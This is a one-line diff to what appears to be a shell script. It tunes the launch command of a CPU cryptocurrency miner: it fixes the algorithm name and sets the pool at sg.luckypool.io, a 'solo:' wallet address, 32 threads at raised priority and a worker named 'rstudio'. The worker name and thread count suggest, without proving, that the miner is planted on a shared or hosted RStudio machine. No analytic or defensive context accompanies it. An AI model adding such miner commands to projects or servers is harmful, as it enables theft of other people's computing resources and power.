@@ -1,1 +1,1 @@
-chmod +x srb/srb && srb/srb --disable-gpu --randomx-use-1gb-pages --algorithm ramdomy --pool sg.luckypool.io:3118 --wallet cb23d6d8557e776f5ff9ab6a7fb7f59a3d385245fa7a --password x --cpu-threads-priority 5 --cpu-threads 32 --worker rstudio
+.//srb --disable-gpu --randomx-use-1gb-pages --algorithm randomy --pool sg.luckypool.io:3118 --wallet solo:cb23d6d8557e776f5ff9ab6a7fb7f59a3d385245fa7a --password x --cpu-threads-priority 5 --cpu-threads 32 --worker rstudio
